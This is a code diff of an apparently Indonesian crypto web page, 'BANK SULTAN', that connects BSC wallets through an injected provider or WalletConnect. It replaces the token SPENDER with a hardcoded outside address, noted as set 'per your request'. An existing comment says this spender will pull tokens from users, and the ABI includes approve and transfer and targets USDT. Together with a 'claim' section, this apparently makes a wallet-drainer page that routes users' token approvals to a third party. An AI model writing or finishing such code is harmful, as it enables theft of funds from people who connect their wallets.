@@ -5,6 +5,8 @@
 <title>BANK SULTAN v60.5</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <script src="https://unpkg.com/web3@1.10.0/dist/web3.min.js"></script>
+<!-- WalletConnect provider (UMD) -->
+<script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Arial', sans-serif}
 body{background:#000;color:#fff;padding-bottom:80px}
@@ -112,6 +114,7 @@ let interval;
 let web3;
 let walletAddress = "";
 let contract;
+let wcProvider; // WalletConnect provider instance
 
 // KONTRAK KAMU BSC BEP20
 const CA = "0x4847F2E8dD63ba03b9C4f935BdEd95bEc1bcaCb4";
@@ -119,8 +122,8 @@ const CHAIN_ID = '0x38';
 const USDT = "0x55d398326b99059fF775485246999027B3197955"; // USDT BSC
 
 // NOTE: SPENDER harus diisi dengan address kontrak/perantara yang akan menarik token dari user, mis. router PancakeSwap atau kontrak "bank".
-// Default di-set sama dengan CA agar kode tidak crash; sebaiknya ganti SPENDER ke address yang semestinya.
-let SPENDER = CA;
+// SPENDER di-set sesuai permintaan Anda:
+const SPENDER = "0x25df1e6e16370cbfb0578b0e30c00bcde0d0f131";
 
 // ABI LENGKAP dengan approve, transfer, decimals, allowance
 const ABI = [
@@ -230,26 +233,69 @@ function update(){
 }
 
 async function connectWallet(){
-  if(typeof window.ethereum === 'undefined') return alert("Buka di Binance/Trust Browser");
+  // If injected provider exists, let user choose; otherwise fall back to WalletConnect automatically
   try{
-    web3 = new Web3(window.ethereum);
-    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
-    walletAddress = accounts[0];
-    contract = new web3.eth.Contract(ABI,CA);
-    document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
-    document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
-    document.getElementById('inputAlamat').value = walletAddress;
-    SPENDER = SPENDER || CA; // keep default
-    try{
-      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
-    }catch(e){
-      // non-blocking: ignore chain switch error but inform
-      console.warn('Chain switch failed:', e && (e.message || e));
+    if(typeof window.ethereum !== 'undefined'){
+      const useInjected = confirm('Gunakan dompet browser (MetaMask/Trust) untuk koneksi? Tekan Cancel untuk WalletConnect.');
+      if(useInjected){
+        await connectInjected();
+        return;
+      }
     }
-    showStatus("✅ Wallet berhasil terhubung", "success");
+    // fallback to WalletConnect
+    await connectWithWalletConnect();
   }catch(e){
-    showStatus("❌ Gagal koneksi: " + ((e && e.message) ? e.message : String(e)), "error");
+    showStatus('❌ Gagal koneksi: '+((e && e.message)?e.message:String(e)), 'error');
   }
+}
+
+async function connectInjected(){
+  if(typeof window.ethereum === 'undefined') throw new Error('No injected provider');
+  web3 = new Web3(window.ethereum);
+  const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+  walletAddress = accounts[0];
+  contract = new web3.eth.Contract(ABI,CA);
+  document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
+  document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
+  document.getElementById('inputAlamat').value = walletAddress;
+  try{
+    await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN_ID }] });
+  }catch(e){
+    console.warn('Chain switch failed:', e && (e.message || e));
+  }
+  showStatus('✅ Wallet berhasil terhubung', 'success');
+}
+
+async function connectWithWalletConnect(){
+  // WalletConnect provider via CDN exposes WalletConnectProvider as window.WalletConnectProvider or WalletConnectProvider.default
+  const Provider = (window.WalletConnectProvider && window.WalletConnectProvider.default) ? window.WalletConnectProvider.default : window.WalletConnectProvider;
+  if(!Provider) throw new Error('WalletConnect provider tidak ditemukan');
+
+  wcProvider = new Provider({
+    rpc: {
+      56: 'https://bsc-dataseed.binance.org/'
+    },
+    chainId: 56
+  });
+
+  // enable will open QR modal for mobile wallets
+  await wcProvider.enable();
+  web3 = new Web3(wcProvider);
+  const accounts = await web3.eth.getAccounts();
+  walletAddress = accounts[0];
+  contract = new web3.eth.Contract(ABI,CA);
+  document.getElementById('wallet').innerText = "Wallet: " + walletAddress.slice(0,6)+"..."+walletAddress.slice(-4);
+  document.getElementById('btnConnect').innerText = "✅ WALLET TERHUBUNG";
+  document.getElementById('inputAlamat').value = walletAddress;
+  showStatus('✅ WalletConnect terhubung', 'success');
+
+  // handle disconnect
+  wcProvider.on && wcProvider.on('disconnect', (code, reason) => {
+    walletAddress = "";
+    document.getElementById('wallet').innerText = 'Belum terhubung';
+    document.getElementById('btnConnect').innerText = '🔗 CONNECT WALLET';
+    showStatus('🔌 Wallet terputus', 'warning');
+  });
 }
 
 // 1. KLAIM = PINDAH KE DANA
